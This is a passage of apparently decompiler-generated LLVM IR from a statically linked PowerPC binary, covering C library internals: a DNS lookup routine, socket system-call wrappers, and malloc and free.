  store i32 %v3_100056d8, i32* %r29.global-to-local, align 4
  store i32 %v2_100056b4, i32* @r3, align 4
  %v0_100056e4 = call i32 @__pthread_return_void()
  %v0_100056ec = load i32, i32* @r23, align 4
  store i32 %v0_100056ec, i32* %r3.global-to-local, align 4
  %v2_100056fc = ptrtoint i32* %stack_var_-120 to i32
  %v2_10005700 = ptrtoint i32* %stack_var_-100 to i32
  %v0_10005704 = load i32, i32* %r22.global-to-local, align 4
  store i32 268457748, i32* @lr, align 4
  %v6_10005710 = inttoptr i32 %v0_100056ec to i8*
  %v7_10005710 = call i32 @__dns_lookup(i8* %v6_10005710, i32 1, i32 %v3_100056d8, i32 ptrtoint (i32* @global_var_1001fef4.386 to i32), i32 %v2_100056fc, i32 %v2_10005700)
  store i32 %v7_10005710, i32* %r3.global-to-local, align 4
  %v1_10005714 = icmp slt i32 %v7_10005710, 0
  br i1 %v1_10005714, label %dec_label_pc_1000585c, label %dec_label_pc_1000571c

dec_label_pc_1000571c:                            ; preds = %dec_label_pc_100056a8
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_10005724 = add i32 %tmp19, 4
  %v2_10005728 = mul i32 %v0_10005704, %v1_10005724
  %v1_1000572c = add i32 %v2_10005728, 256
  %v1_10005730 = load i32, i32* @r27, align 4
  %v3_10005730 = icmp ugt i32 %v1_1000572c, %v1_10005730
  br i1 %v3_10005730, label %dec_label_pc_10005738, label %dec_label_pc_10005754

dec_label_pc_10005738:                            ; preds = %dec_label_pc_1000571c
  %v3_10005738 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10005738, i32* @r3, align 4
  store i32 268457792, i32* @lr, align 4
  %v0_1000573c = call i32 @free()
  %v3_10005740 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10005740, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005748.387 to i32), i32* @lr, align 4
  %v0_10005744 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000574c = load i32, i32* @r19, align 4
  %v1_1000574c = load i32, i32* @r24, align 4
  %v2_1000574c = inttoptr i32 %v1_1000574c to i32*
  store i32 %v0_1000574c, i32* %v2_1000574c, align 4
  br label %dec_label_pc_1000587c

dec_label_pc_10005754:                            ; preds = %dec_label_pc_1000571c
  %v3_10005754 = icmp eq i32 %v0_10005704, 0
  br i1 %v3_10005754, label %dec_label_pc_10005754.dec_label_pc_100057f8_crit_edge, label %dec_label_pc_1000575c

dec_label_pc_10005754.dec_label_pc_100057f8_crit_edge: ; preds = %dec_label_pc_10005754
  %v0_10005800.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100057f8

dec_label_pc_1000575c:                            ; preds = %dec_label_pc_10005754
  %v2_1000575c = mul i32 %v0_10005704, %tmp19
  store i32 %v2_1000575c, i32* @r5, align 4
  %v0_10005760 = load i32, i32* @r30, align 4
  %v1_10005760 = add i32 %v0_10005760, 36
  store i32 %v1_10005760, i32* %r3.global-to-local, align 4
  %v0_10005764 = load i32, i32* @r31, align 4
  store i32 268457836, i32* @lr, align 4
  %v2_10005768 = call i32 @memmove(i32 %v1_10005760, i32 %v0_10005764)
  store i32 %v2_10005768, i32* %r3.global-to-local, align 4
  store i32 %v2_1000575c, i32* %r0.global-to-local, align 4
  %v0_10005778 = load i32, i32* @r30, align 4
  %v1_10005778 = load i32, i32* @r31, align 4
  %v3_10005778 = add i32 %v1_10005778, %v2_1000575c
  %v4_10005778 = inttoptr i32 %v3_10005778 to i32*
  store i32 %v0_10005778, i32* %v4_10005778, align 4
  %v0_1000577c = load i32, i32* @r31, align 4
  %v1_1000577c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000577c = add i32 %v1_1000577c, %v0_1000577c
  store i32 %v2_1000577c, i32* @r25, align 4
  %v1_10005784 = add i32 %v0_10005704, -1
  store i32 %v1_10005784, i32* %r11.global-to-local, align 4
  %v1_10005788 = add i32 %v0_10005704, 1
  %v2_1000578c = icmp sgt i32 %v1_10005784, -1
  store i32 %v1_10005788, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000578c, label %dec_label_pc_100057bc.preheader, label %dec_label_pc_10005798

dec_label_pc_10005798:                            ; preds = %dec_label_pc_1000575c
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_100057bc.preheader

dec_label_pc_100057bc.preheader:                  ; preds = %dec_label_pc_10005798, %dec_label_pc_1000575c
  %v0_100057c46 = phi i32 [ 1, %dec_label_pc_10005798 ], [ %v1_10005788, %dec_label_pc_1000575c ]
  %v1_100057bc3 = mul i32 %v1_10005784, 4
  store i32 %v1_100057bc3, i32* %r0.global-to-local, align 4
  %v2_100057c05 = add i32 %v2_1000577c, %v1_100057bc3
  %v1_100057c47 = add i32 %v0_100057c46, -1
  store i32 %v1_100057c47, i32* %ctr.global-to-local, align 4
  %v2_100057c48 = icmp eq i32 %v1_100057c47, 0
  br i1 %v2_100057c48, label %dec_label_pc_100057c8, label %dec_label_pc_100057a4

dec_label_pc_100057a4:                            ; preds = %dec_label_pc_100057bc.preheader, %dec_label_pc_100057a4.dec_label_pc_100057a4_crit_edge
  %v1_100057b8 = phi i32 [ %v2_100057c0, %dec_label_pc_100057a4.dec_label_pc_100057a4_crit_edge ], [ %v2_100057c05, %dec_label_pc_100057bc.preheader ]
  %v0_100057b0 = phi i32 [ %v0_100057b0.pre, %dec_label_pc_100057a4.dec_label_pc_100057a4_crit_edge ], [ %v0_1000577c, %dec_label_pc_100057bc.preheader ]
  %v0_100057a8 = phi i32 [ %v0_100057bc, %dec_label_pc_100057a4.dec_label_pc_100057a4_crit_edge ], [ %v1_10005784, %dec_label_pc_100057bc.preheader ]
  %v2_100057a8 = mul i32 %v0_100057a8, %tmp19
  %v1_100057ac = add i32 %v0_100057a8, -1
  store i32 %v1_100057ac, i32* %r11.global-to-local, align 4
  %v2_100057b0 = add i32 %v0_100057b0, -8
  %v1_100057b4 = add i32 %v2_100057b0, %v2_100057a8
  %v2_100057b8 = add i32 %v1_100057b8, 4
  %v3_100057b8 = inttoptr i32 %v2_100057b8 to i32*
  store i32 %v1_100057b4, i32* %v3_100057b8, align 4
  %v0_100057bc = load i32, i32* %r11.global-to-local, align 4
  %v1_100057bc = mul i32 %v0_100057bc, 4
  store i32 %v1_100057bc, i32* %r0.global-to-local, align 4
  %v1_100057c0 = load i32, i32* @r25, align 4
  %v0_100057c4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100057c4 = add i32 %v0_100057c4, -1
  store i32 %v1_100057c4, i32* %ctr.global-to-local, align 4
  %v2_100057c4 = icmp eq i32 %v1_100057c4, 0
  br i1 %v2_100057c4, label %dec_label_pc_100057c8, label %dec_label_pc_100057a4.dec_label_pc_100057a4_crit_edge

dec_label_pc_100057a4.dec_label_pc_100057a4_crit_edge: ; preds = %dec_label_pc_100057a4
  %v2_100057c0 = add i32 %v1_100057c0, %v1_100057bc
  %v0_100057b0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100057a4

dec_label_pc_100057c8:                            ; preds = %dec_label_pc_100057a4, %dec_label_pc_100057bc.preheader
  %v1_100057d4 = phi i32 [ %v2_1000577c, %dec_label_pc_100057bc.preheader ], [ %v1_100057c0, %dec_label_pc_100057a4 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100057d0 = mul i32 %v0_10005704, 4
  %v2_100057d4 = add i32 %v1_100057d0, 4
  %v2_100057d8 = add i32 %v2_100057d4, %v1_100057d4
  %v3_100057d8 = inttoptr i32 %v2_100057d8 to i32*
  store i32 0, i32* %v3_100057d8, align 4
  %v0_100057e4 = load i32, i32* @r25, align 4
  %v2_100057e4 = add i32 %v0_100057e4, %v1_100057d0
  store i32 %v2_100057e4, i32* %r11.global-to-local, align 4
  %v1_100057e8 = load i32, i32* @r31, align 4
  %v2_100057e8 = sub i32 %v1_100057e8, %v2_100057e4
  %v1_100057ec = add i32 %v2_100057e4, 8
  store i32 %v1_100057ec, i32* @r31, align 4
  %v0_100057f0 = load i32, i32* @r27, align 4
  %v2_100057f0 = add i32 %v0_100057f0, %v2_100057e8
  %v1_100057f4 = add i32 %v2_100057f0, -8
  br label %dec_label_pc_100057f8

dec_label_pc_100057f8:                            ; preds = %dec_label_pc_10005754.dec_label_pc_100057f8_crit_edge, %dec_label_pc_100057c8
  %v0_10005800 = phi i32 [ %v0_10005800.pre, %dec_label_pc_10005754.dec_label_pc_100057f8_crit_edge ], [ %v1_100057ec, %dec_label_pc_100057c8 ]
  %v0_100057fc = phi i32 [ %v1_10005730, %dec_label_pc_10005754.dec_label_pc_100057f8_crit_edge ], [ %v1_100057f4, %dec_label_pc_100057c8 ]
  %v3_100057f8 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_100057f8, i32* @r4, align 4
  store i32 %v0_10005800, i32* %r3.global-to-local, align 4
  store i32 268457992, i32* @lr, align 4
  %v3_10005804 = call i32 @strncpy(i32 %v0_10005800, i32 %v3_100057f8, i32 %v0_100057fc)
  %v3_10005808 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_10005808, i32* @r3, align 4
  store i32 268458000, i32* @lr, align 4
  %v0_1000580c = call i32 @free()
  store i32 %v0_1000580c, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_10005814 = icmp eq i32 %tmp18, 1
  br i1 %v3_10005814, label %dec_label_pc_1000581c, label %dec_label_pc_10005864

dec_label_pc_1000581c:                            ; preds = %dec_label_pc_100057f8
  store i32 4, i32* @r5, align 4
  %v0_10005824 = load i32, i32* @r30, align 4
  store i32 %v0_10005824, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000582c.388 to i32), i32* @lr, align 4
  %v0_10005828 = call i32 @memcpy()
  %v1_10005830 = load i32, i32* @r26, align 4
  %v2_10005830 = add i32 %v1_10005830, 8
  %v3_10005830 = inttoptr i32 %v2_10005830 to i32*
  store i32 2, i32* %v3_10005830, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10005838 = load i32, i32* @r26, align 4
  %v2_10005838 = add i32 %v1_10005838, 12
  %v3_10005838 = inttoptr i32 %v2_10005838 to i32*
  store i32 4, i32* %v3_10005838, align 4
  %v0_1000583c = load i32, i32* @r31, align 4
  %v1_1000583c = load i32, i32* @r26, align 4
  %v2_1000583c = inttoptr i32 %v1_1000583c to i32*
  store i32 %v0_1000583c, i32* %v2_1000583c, align 4
  %v0_10005840 = load i32, i32* @r25, align 4
  %v1_10005840 = load i32, i32* @r26, align 4
  %v2_10005840 = add i32 %v1_10005840, 16
  %v3_10005840 = inttoptr i32 %v2_10005840 to i32*
  store i32 %v0_10005840, i32* %v3_10005840, align 4
  %v0_10005844 = load i32, i32* @r21, align 4
  %v1_10005844 = load i32, i32* @r26, align 4
  %v2_10005844 = add i32 %v1_10005844, 4
  %v3_10005844 = inttoptr i32 %v2_10005844 to i32*
  store i32 %v0_10005844, i32* %v3_10005844, align 4
  %v3_10005848 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10005848, i32* @r3, align 4
  store i32 268458064, i32* @lr, align 4
  %v0_1000584c = call i32 @free()
  store i32 %v0_1000584c, i32* %r3.global-to-local, align 4
  %v0_10005850 = load i32, i32* @r26, align 4
  %v1_10005850 = load i32, i32* @r20, align 4
  %v2_10005850 = inttoptr i32 %v1_10005850 to i32*
  store i32 %v0_10005850, i32* %v2_10005850, align 4
  br label %dec_label_pc_1000585c

dec_label_pc_1000585c:                            ; preds = %dec_label_pc_10005864, %dec_label_pc_100056a8, %dec_label_pc_1000581c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000581c ], [ 2, %dec_label_pc_100056a8 ], [ 2, %dec_label_pc_10005864 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000581c ], [ 1, %dec_label_pc_100056a8 ], [ 1, %dec_label_pc_10005864 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000585c = load i32, i32* @r24, align 4
  %v2_1000585c = inttoptr i32 %v1_1000585c to i32*
  store i32 %storemerge, i32* %v2_1000585c, align 4
  br label %dec_label_pc_1000587c

dec_label_pc_10005864:                            ; preds = %dec_label_pc_100057f8
  %v3_10005864 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10005864, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000586c.389 to i32), i32* @lr, align 4
  %v0_10005868 = call i32 @free()
  store i32 %v0_10005868, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000585c

dec_label_pc_10005878:                            ; preds = %dec_label_pc_1000563c, %dec_label_pc_10005620, %dec_label_pc_10005614, %dec_label_pc_10005604, %dec_label_pc_100055f4
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000587c

dec_label_pc_1000587c:                            ; preds = %dec_label_pc_100055d8, %dec_label_pc_100055d0, %dec_label_pc_10005584, %entry, %dec_label_pc_1000585c, %dec_label_pc_10005738, %dec_label_pc_1000567c, %dec_label_pc_10005878
  store i32 %v0_10005550, i32* %r0.global-to-local, align 4
  %v0_1000588c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000588c

; uselistorder directives
  uselistorder i32 %v0_10005800, { 1, 0 }
  uselistorder i32 %v1_100057d0, { 1, 0 }
  uselistorder i32 %v1_100057c4, { 1, 0 }
  uselistorder i32 %v1_100057bc, { 1, 0 }
  uselistorder i32 %v0_100057a8, { 1, 0 }
  uselistorder i32 %v1_100057bc3, { 1, 0 }
  uselistorder i32 %v1_10005784, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1000577c, { 1, 0, 2 }
  uselistorder i32 %v0_10005704, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_10005648, { 1, 0, 2 }
  uselistorder i32 %v0_10005604.pre, { 0, 2, 1 }
  uselistorder i32 %v1_100055ec, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 20, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1000587c, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000585c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100057f8, { 1, 0 }
  uselistorder label %dec_label_pc_100057a4, { 1, 0 }
  uselistorder label %dec_label_pc_10005604, { 1, 0 }
}

define i32 @__libc_accept(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100058a4 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458164, i32* @lr, align 4
  %v2_100058b0 = call i32 @__socketcall(i32 5, i32 %v2_100058a4)
  ret i32 %v2_100058b0

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @bind(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100058d8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458216, i32* @lr, align 4
  %v2_100058e4 = call i32 @__socketcall(i32 2, i32 %v2_100058d8)
  ret i32 %v2_100058e4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_1000590c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458268, i32* @lr, align 4
  %v2_10005918 = call i32 @__socketcall(i32 3, i32 %v2_1000590c)
  ret i32 %v2_10005918

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @listen(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10005940 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458316, i32* @lr, align 4
  %v2_10005948 = call i32 @__socketcall(i32 4, i32 %v2_10005940)
  ret i32 %v2_10005948

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10005970 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458372, i32* @lr, align 4
  %v2_10005980 = call i32 @__socketcall(i32 10, i32 %v2_10005970)
  ret i32 %v2_10005980

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_100059a8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458428, i32* @lr, align 4
  %v2_100059b8 = call i32 @__socketcall(i32 9, i32 %v2_100059a8)
  ret i32 %v2_100059b8

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_100059e0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268458492, i32* @lr, align 4
  %v2_100059f8 = call i32 @__socketcall(i32 11, i32 %v2_100059e0)
  ret i32 %v2_100059f8

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-40, align 4
  %v2_10005a20 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268458552, i32* @lr, align 4
  %v2_10005a34 = call i32 @__socketcall(i32 14, i32 %v2_10005a20)
  ret i32 %v2_10005a34

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_10005a5c = ptrtoint i32* %stack_var_-24 to i32
  store i32 268458604, i32* @lr, align 4
  %v2_10005a68 = call i32 @__socketcall(i32 1, i32 %v2_10005a5c)
  ret i32 %v2_10005a68

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 1, 8, 0, 3, 4, 7, 2, 6, 5 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v0_10005a7c = load i32, i32* @r3, align 4
  %v3_10005a7c = icmp eq i32 %v0_10005a7c, 0
  br i1 %v3_10005a7c, label %dec_label_pc_10005a94, label %dec_label_pc_10005a98

dec_label_pc_10005a94:                            ; preds = %entry
  br label %dec_label_pc_10005a98

dec_label_pc_10005a98:                            ; preds = %entry, %dec_label_pc_10005a94
  %v0_10005aa8 = phi i32 [ 1, %dec_label_pc_10005a94 ], [ %v0_10005a7c, %entry ]
  %v3_10005a9c = icmp ugt i32 %v0_10005aa8, -8
  br i1 %v3_10005a9c, label %dec_label_pc_10005bac, label %dec_label_pc_10005aa4

dec_label_pc_10005aa4:                            ; preds = %dec_label_pc_10005a98
  %v1_10005aa8 = add i32 %v0_10005aa8, 4
  store i32 ptrtoint (i32* @global_var_1001fe9c.390 to i32), i32* @r29, align 4
  store i32 %v1_10005aa8, i32* %stack_var_-40, align 4
  %v0_10005ab8 = call i32 @__pthread_return_0()
  %v2_10005ac0 = ptrtoint i32* %stack_var_-40 to i32
  %v3_10005ac8 = call i32 @__heap_alloc(i32* inttoptr (i32 268556284 to i32*), i32 %v2_10005ac0)
  store i32 %v3_10005ac8, i32* %r31.global-to-local, align 4
  %v0_10005ad4 = call i32 @__pthread_return_0()
  %v3_10005ad8 = icmp eq i32 %v3_10005ac8, 0
  br i1 %v3_10005ad8, label %dec_label_pc_10005ae0, label %dec_label_pc_10005b90.thread

dec_label_pc_10005b90.thread:                     ; preds = %dec_label_pc_10005aa4
  br label %dec_label_pc_10005ba4

dec_label_pc_10005ae0:                            ; preds = %dec_label_pc_10005aa4
  %v3_10005ae4 = load i32, i32* @global_var_1001d86c.340, align 4
  store i32 %v3_10005ae4, i32* %r31.global-to-local, align 4
  %v3_10005ae8 = load i32, i32* %stack_var_-40, align 4
  %v2_10005aec = icmp ult i32 %v3_10005ae8, %v3_10005ae4
  br i1 %v2_10005aec, label %dec_label_pc_10005b04, label %dec_label_pc_10005af4

dec_label_pc_10005af4:                            ; preds = %dec_label_pc_10005ae0
  %v1_10005af8 = sub i32 0, %v3_10005ae4
  %v2_10005af4 = add i32 %v3_10005ae4, -1
  %v1_10005afc = add i32 %v2_10005af4, %v3_10005ae8
  %v2_10005b00 = and i32 %v1_10005afc, %v1_10005af8
  store i32 %v2_10005b00, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10005b04

dec_label_pc_10005b04:                            ; preds = %dec_label_pc_10005ae0, %dec_label_pc_10005af4
  %v0_10005b10 = call i32 @__pthread_return_0()
  %v0_10005b14 = load i32, i32* %r31.global-to-local, align 4
  store i32 268458780, i32* @lr, align 4
  %v1_10005b18 = call i32 @__GI_sbrk(i32 %v0_10005b14)
  %v3_10005b1c = icmp eq i32 %v1_10005b18, -1
  br i1 %v3_10005b1c, label %dec_label_pc_10005b3c, label %dec_label_pc_10005b24

dec_label_pc_10005b24:                            ; preds = %dec_label_pc_10005b04
  %v1_10005b24 = add i32 %v1_10005b18, 3
  %v1_10005b28 = call i32 @__asm_rlwinm(i32 %v1_10005b24, i32 0, i32 0, i32 29)
  store i32 %v1_10005b28, i32* @r30, align 4
  %v4_10005b2c = icmp eq i32 %v1_10005b28, %v1_10005b18
  br i1 %v4_10005b2c, label %dec_label_pc_10005b3c, label %dec_label_pc_10005b34

dec_label_pc_10005b34:                            ; preds = %dec_label_pc_10005b24
  %v2_10005b34 = sub i32 %v1_10005b28, %v1_10005b18
  store i32 268458812, i32* @lr, align 4
  %v1_10005b38 = call i32 @__GI_sbrk(i32 %v2_10005b34)
  br label %dec_label_pc_10005b3c

dec_label_pc_10005b3c:                            ; preds = %dec_label_pc_10005b24, %dec_label_pc_10005b04, %dec_label_pc_10005b34
  %v0_10005b44 = call i32 @__pthread_return_0()
  %v0_10005b48 = load i32, i32* @r30, align 4
  %v3_10005b48 = icmp eq i32 %v0_10005b48, -1
  br i1 %v3_10005b48, label %dec_label_pc_10005bac, label %dec_label_pc_10005b90

dec_label_pc_10005b90:                            ; preds = %dec_label_pc_10005b3c
  store i32 ptrtoint (i32* @global_var_1001fe9c.390 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1001d7fc to i32), i32* @r29, align 4
  %v0_10005b64 = call i32 @__pthread_return_0()
  %v0_10005b68 = load i32, i32* @r31, align 4
  %v0_10005b6c = load i32, i32* @r30, align 4
  %v0_10005b70 = load i32, i32* @r29, align 4
  store i32 268458872, i32* @lr, align 4
  %v3_10005b74 = inttoptr i32 %v0_10005b70 to i32*
  %v4_10005b74 = call i32 @__heap_free(i32* %v3_10005b74, i32 %v0_10005b6c, i32 %v0_10005b68)
  %v0_10005b78 = load i32, i32* @r29, align 4
  %v2_10005b80 = inttoptr i32 %v0_10005b78 to i32*
  %v3_10005b80 = call i32 @__heap_alloc(i32* %v2_10005b80, i32 %v2_10005ac0)
  store i32 %v3_10005b80, i32* %r31.global-to-local, align 4
  %v0_10005b8c = call i32 @__pthread_return_0()
  %v3_10005b90 = icmp eq i32 %v3_10005b80, 0
  br i1 %v3_10005b90, label %dec_label_pc_10005ba4.thread, label %dec_label_pc_10005ba4

dec_label_pc_10005ba4.thread:                     ; preds = %dec_label_pc_10005b90
  br label %dec_label_pc_10005bac

dec_label_pc_10005ba4:                            ; preds = %dec_label_pc_10005b90, %dec_label_pc_10005b90.thread
  %v0_10005ba4.pr6 = phi i32 [ %v3_10005ac8, %dec_label_pc_10005b90.thread ], [ %v3_10005b80, %dec_label_pc_10005b90 ]
  %v3_10005b98 = load i32, i32* %stack_var_-40, align 4
  %v2_10005b9c = inttoptr i32 %v0_10005ba4.pr6 to i32*
  store i32 %v3_10005b98, i32* %v2_10005b9c, align 4
  %v0_10005ba0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10005ba0 = add i32 %v0_10005ba0, 4
  store i32 %v1_10005ba0, i32* @r31, align 4
  %v3_10005ba4 = icmp eq i32 %v1_10005ba0, 0
  br i1 %v3_10005ba4, label %dec_label_pc_10005bac, label %dec_label_pc_10005bbc

dec_label_pc_10005bac:                            ; preds = %dec_label_pc_10005ba4.thread, %dec_label_pc_10005ba4, %dec_label_pc_10005b3c, %dec_label_pc_10005a98
  %v0_10005bac = call i32 @__errno_location()
  %v2_10005bb4 = inttoptr i32 %v0_10005bac to i32*
  store i32 12, i32* %v2_10005bb4, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_10005bbc

dec_label_pc_10005bbc:                            ; preds = %dec_label_pc_10005ba4, %dec_label_pc_10005bac
  %v0_10005bc0 = phi i32 [ %v1_10005ba0, %dec_label_pc_10005ba4 ], [ 0, %dec_label_pc_10005bac ]
  ret i32 %v0_10005bc0

; uselistorder directives
  uselistorder i32 %v1_10005ba0, { 1, 0, 2 }
  uselistorder i32 %v1_10005b28, { 1, 0, 2 }
  uselistorder i32 %v1_10005b18, { 2, 0, 1, 3 }
  uselistorder i32 %v3_10005ae4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10005ac8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_10005bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10005bac, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10005b3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005b04, { 1, 0 }
  uselistorder label %dec_label_pc_10005a98, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %v0_10005bd4 = load i32, i32* @r3, align 4
  %v3_10005bd4 = icmp eq i32 %v0_10005bd4, 0
  br i1 %v3_10005bd4, label %dec_label_pc_10005cc0, label %dec_label_pc_10005bec

dec_label_pc_10005bec:                            ; preds = %entry
  %v1_10005bf0 = add i32 %v0_10005bd4, -4
  %v2_10005bf0 = inttoptr i32 %v1_10005bf0 to i32*
  %v3_10005bf0 = load i32, i32* %v2_10005bf0, align 4
  store i32 %v3_10005bf0, i32* @r28, align 4
  store i32 268566528, i32* @r26, align 4
  %v0_10005c04 = call i32 @__pthread_return_0()
  %v0_10005c0c = load i32, i32* @r28, align 4
  store i32 268459032, i32* @lr, align 4
  %v4_10005c14 = call i32 @__heap_free(i32* nonnull @global_var_1001d7fc, i32 %v1_10005bf0, i32 %v0_10005c0c)
  %v3_10005c1c = load i32, i32* @global_var_1001d86c.340, align 4
  store i32 %v4_10005c14, i32* @r29, align 4
  %v1_10005c24 = inttoptr i32 %v4_10005c14 to i32*
  %v2_10005c24 = load i32, i32* %v1_10005c24, align 4
  store i32 %v2_10005c24, i32* @r27, align 4
  %v1_10005c28 = mul i32 %v3_10005c1c, 8
  %v2_10005c2c = icmp ult i32 %v2_10005c24, %v1_10005c28
  br i1 %v2_10005c2c, label %dec_label_pc_10005c60, label %dec_label_pc_10005c34

dec_label_pc_10005c34:                            ; preds = %dec_label_pc_10005bec
  store i32 ptrtoint (i32* @global_var_1001fecc.393 to i32), i32* @r28, align 4
  %v0_10005c44 = call i32 @__pthread_return_0()
  store i32 268459088, i32* @lr, align 4
  %v1_10005c4c = call i32 @__GI_sbrk(i32 0)
  %v0_10005c50 = load i32, i32* @r31, align 4
  %v4_10005c50 = icmp eq i32 %v0_10005c50, %v1_10005c4c
  br i1 %v4_10005c50, label %dec_label_pc_10005c68, label %dec_label_pc_10005c58

dec_label_pc_10005c58:                            ; preds = %dec_label_pc_10005c34
  %v0_10005c5c = call i32 @__pthread_return_0()
  br label %dec_label_pc_10005c60

dec_label_pc_10005c60:                            ; preds = %dec_label_pc_10005bec, %dec_label_pc_10005c58
  br label %dec_label_pc_10005cbc

dec_label_pc_10005c68:                            ; preds = %dec_label_pc_10005c34
  %v0_10005c68 = load i32, i32* @r29, align 4
  %v1_10005c68 = add i32 %v0_10005c68, 4
  %v2_10005c68 = inttoptr i32 %v1_10005c68 to i32*
  %v3_10005c68 = load i32, i32* %v2_10005c68, align 4
  %v3_10005c6c = icmp eq i32 %v3_10005c68, 0
  br i1 %v3_10005c6c, label %dec_label_pc_10005c7c, label %dec_label_pc_10005c74

dec_label_pc_10005c74:                            ; preds = %dec_label_pc_10005c68
